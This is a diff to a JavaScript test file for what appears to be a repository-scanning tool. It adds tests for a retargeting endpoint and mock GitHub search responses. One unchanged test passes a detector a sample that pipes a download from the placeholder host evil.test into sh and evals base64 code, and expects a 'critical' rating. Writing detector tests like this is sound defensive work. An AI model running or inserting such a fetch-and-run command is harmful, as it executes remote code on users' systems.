@@ -54,6 +54,7 @@ try {
   assert.ok(status.endpoints.includes("GET /api/connector/status"));
   assert.ok(status.endpoints.includes("POST /api/connector/apply"));
   assert.ok(status.endpoints.includes("GET /api/telemetry/stream"));
+  assert.ok(status.endpoints.includes("POST /api/intelligence/target"));
   assert.equal(
     scanThreatSignatures("child_process.exec('curl https://evil.test/payload.sh | sh'); eval(Buffer.from('YWxlcnQ=', 'base64').toString())").risk_tier,
     "critical"
@@ -95,6 +96,36 @@ try {
   const stagedDispatch = await readFile(path.join(tmpRoot, ".vnem", "staging", stagingFiles[0]), "utf8");
   assert.match(stagedDispatch, /VNEM Live Intelligence Dispatch: ovvuh\/vnem-agent-workflow/);
   assert.match(stagedDispatch, /Threat score: 0%/);
+
+  const target = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
+    query: "rust entity component system",
+    threat_tolerance: 50
+  }));
+  assert.equal(target.statusCode, 202);
+  assertJsonContentType(target);
+  assert.equal(target.body.status, "retargeted");
+  assert.equal(target.body.cycle_status, "started");
+  assert.equal(target.body.mission.query, "rust entity component system");
+  assert.equal(target.body.mission.threat_tolerance, 50);
+
+  const retargetedHistory = await waitForTelemetryHistory(port, (body) => (
+    body.mission?.query === "rust entity component system" &&
+    body.pipeline?.mission?.threat_tolerance === 50 &&
+    body.active_ingestions?.[0]?.title === "bevyengine/bevy" &&
+    body.active_ingestions?.[0]?.status === "staged_for_review"
+  ));
+  assert.equal(retargetedHistory.body.active_ingestions[0].repository.query, "rust entity component system");
+  assert.equal(retargetedHistory.body.active_ingestions[0].status, "staged_for_review");
+  assert.equal(retargetedHistory.body.active_ingestions[0].protection_report.block_threshold, 50);
+  assert.equal(mockFetch.calls.some((url) => url.includes("q=rust+entity+component+system")), true);
+
+  const invalidTarget = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
+    query: "x",
+    threat_tolerance: 30
+  }));
+  assert.equal(invalidTarget.statusCode, 400);
+  assertJsonContentType(invalidTarget);
+  assert.equal(invalidTarget.body.error_code, "QUERY_TOO_SHORT");
 
   const telemetry = await requestTelemetry(port);
   assert.equal(telemetry.statusCode, 200);
@@ -154,11 +185,15 @@ try {
   restoreEnv(originalEnv);
 }
 
-function requestJson(port, method, route, headers = {}) {
+function requestJson(port, method, route, headers = {}, body = null) {
   const requestHeaders = {
     Host: `127.0.0.1:${port}`,
     ...headers
   };
+  if (body != null) {
+    requestHeaders["content-type"] = requestHeaders["content-type"] ?? "application/json";
+    requestHeaders["content-length"] = Buffer.byteLength(body);
+  }
 
   return new Promise((resolve, reject) => {
     const request = http.request(
@@ -190,6 +225,9 @@ function requestJson(port, method, route, headers = {}) {
       }
     );
     request.on("error", reject);
+    if (body != null) {
+      request.write(body);
+    }
     request.end();
   });
 }
@@ -246,6 +284,19 @@ function assertJsonContentType(response) {
   assert.match(String(response.headers["content-type"] || ""), /^application\/json(?:;|$)/);
 }
 
+async function waitForTelemetryHistory(port, predicate) {
+  const deadline = Date.now() + 1500;
+  let latest = null;
+  while (Date.now() < deadline) {
+    latest = await requestJson(port, "GET", "/api/telemetry/history");
+    if (predicate(latest.body)) {
+      return latest;
+    }
+    await new Promise((resolve) => setTimeout(resolve, 20));
+  }
+  throw new Error(`Timed out waiting for telemetry history condition. Latest=${JSON.stringify(latest?.body)}`);
+}
+
 function closeServer(targetServer) {
   return new Promise((resolve, reject) => {
     targetServer.close((error) => {
@@ -279,6 +330,31 @@ function createMockFetch() {
     const target = String(url);
     calls.push(target);
     if (target.startsWith("https://api.github.com/search/repositories")) {
+      const query = new URL(target).searchParams.get("q");
+      if (query === "rust entity component system") {
+        return jsonFetchResponse({
+          total_count: 1,
+          incomplete_results: false,
+          items: [
+            {
+              id: 300,
+              name: "bevy",
+              full_name: "bevyengine/bevy",
+              html_url: "https://github.com/bevyengine/bevy",
+              description: "A refreshingly simple data-driven game engine built in Rust with entity component system architecture.",
+              owner: { login: "bevyengine" },
+              default_branch: "main",
+              stargazers_count: 45000,
+              forks_count: 4500,
+              language: "Rust",
+              updated_at: "2026-05-31T12:00:00Z",
+              pushed_at: "2026-05-31T12:00:00Z"
+            }
+          ]
+        }, 200, {
+          etag: "\"vnem-rust-test-etag\""
+        });
+      }
       return jsonFetchResponse({
         total_count: 2,
         incomplete_results: false,
@@ -315,6 +391,17 @@ function createMockFetch() {
       }, 200, {
         etag: "\"vnem-test-etag\""
       });
+    }
+    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/README.md") {
+      return textFetchResponse([
+        "# Bevy",
+        "",
+        "A safe Rust ECS architecture reference for game development, scheduling, and renderer organization.",
+        "No shell bootstrapper or lifecycle install script is required."
+      ].join("\n"));
+    }
+    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/package.json") {
+      return textFetchResponse("not found", 404);
     }
     if (target === "https://raw.githubusercontent.com/ovvuh/vnem-agent-workflow/main/README.md") {
       return textFetchResponse([
